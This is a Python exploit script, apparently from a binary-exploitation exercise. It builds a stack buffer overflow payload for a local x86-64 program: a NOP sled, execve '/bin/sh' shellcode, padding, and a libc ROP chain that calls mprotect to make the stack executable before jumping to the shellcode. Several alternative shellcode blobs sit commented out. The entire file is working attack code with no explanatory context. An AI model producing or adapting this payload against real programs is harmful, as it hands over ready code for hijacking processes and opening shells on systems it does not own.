import sys
from struct import pack
base_libc = 0x007ffff7de0000
base_stak = 0x007ffffffde000
addr      = lambda x:pack("<Q",x)
base      = lambda x:base_libc+x
nops      = b"\x90"*40

shell  = b"\x6a\x3b\x58\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05"


#shell  = b"\x48\x31\xd2"                                  # xor    %rdx, %rdx
#shell += b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      # mov	$0x68732f6e69622f2f, %rbx
#shell += b"\x48\xc1\xeb\x08"                              # shr    $0x8, %rbx
#shell += b"\x53"                                          # push   %rbx
#shell += b"\x48\x89\xe7"                                  # mov    %rsp, %rdi
#shell += b"\x50"                                          # push   %rax
#shell += b"\x57"                                          # push   %rdi
#shell += b"\x48\x89\xe6"                                  # mov    %rsp, %rsi
#shell += b"\xb0\x3b"                                      # mov    $0x3b, %al
#shell += b"\x0f\x05"                                      # syscall

#shell     = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
#b"\xeb\x0e\x2f\x62\x69\x6e\x2f\x73\x68\xff\x2d\x63\xff\x6c\x73\xff\x31\xc0\x88\x05\xf7\xff\xff\xff\x88\x05\xee\xff\xff\xff\x88\x05\xe5\xff\xff\xff\x48\x8d\x3d\xd7\xff\xff\xff\x50\x48\x8d\x35\xda\xff\xff\xff\x56\x48\x8d\x35\xcf\xff\xff\xff\x56\x57\x48\x89\xe6\x48\x89\xc2\xb0\x3b\x0f\x05" #\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05"
#####shell 1
#shell     = b"\x48\x31\xf6\x56\x48\xbf\x2f"
#shell    += b"\x62\x69\x6e\x2f\x2f\x73\x68"
#shell    += b"\x57\x54\x5f\x6a\x3b\x58\x99"
#shell    += b"\x0f\x05"
#####shell 2
#shell     = b"\xb8\x01\x00\x00\x00\x48\xbe"
#shell    += b"\x48\x65\x6c\x6c\x6f\x00\x00"
#shell    += b"\x00\x56\x48\x89\xe6\xba\x05"
#shell    += b"\x00\x00\x00\x0f\x05\xb8\x3c"
#shell    += b"\x00\x00\x00\x0f\x05\x66\x2e"
#shell    += b"\x0f\x1f\x84\x00\x00\x00\x00"
#shell    += b"\x00\x0f\x1f\x44\x00\x00";
######shell 3
#shell      = b"\x48\x31\xd2"                                  # xor    %rdx, %rdx
#shell     += b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      # mov	$0x68732f6e69622f2f, %rbx
#shell     += b"\x48\xc1\xeb\x08"                              # shr    $0x8, %rbx
#shell     += b"\x53"                                          # push   %rbx
#shell     += b"\x48\x89\xe7"                                  # mov    %rsp, %rdi
#shell     += b"\x50"                                          # push   %rax
#shell     += b"\x57"                                          # push   %rdi
#shell     += b"\x48\x89\xe6"                                  # mov    %rsp, %rsi
#shell     += b"\xb0\x3b"                                      # mov    $0x3b, %al
#shell     += b"\x0f\x05"                                      # syscall
#shell     += b"\x6a\x3c"                	                  # push   0x3c
#shell     += b"\x66\x58"                	                  # pop    ax
#shell     += b"\x48\x31\xff"             	                  # xor    rdi,rdi
#shell     += b"\x0f\x05"                	                  # syscall 
padding   = b"A"*(208-(len(shell)+len(nops)))
padding  += b"B"*8
pop_rdi   = 0x0000000000026796
pop_rsi   = 0x000000000002890f
pop_rdx   = 0x00000000000cb1cd
mode      = 0x07
lenght    = 0x101010
mprotect  = 0x7ffff7ed8c20
rip       = 0x7fffffffdd5c+20 #0x7fffffffdd9c
ret       = 0x000000000040118e
exploit   = nops
exploit  += shell
exploit  += padding
exploit  += addr(ret)
exploit  += addr(base(pop_rdi))
exploit  += addr(base_stak)
exploit  += addr(base(pop_rsi))
exploit  += addr(lenght)
exploit  += addr(base(pop_rdx))
exploit  += addr(mode)
exploit  += addr(mprotect)
exploit  += addr(0x7fffffffddf4) #0x7fffffffdd7c)
sys.stdout.buffer.write(exploit)
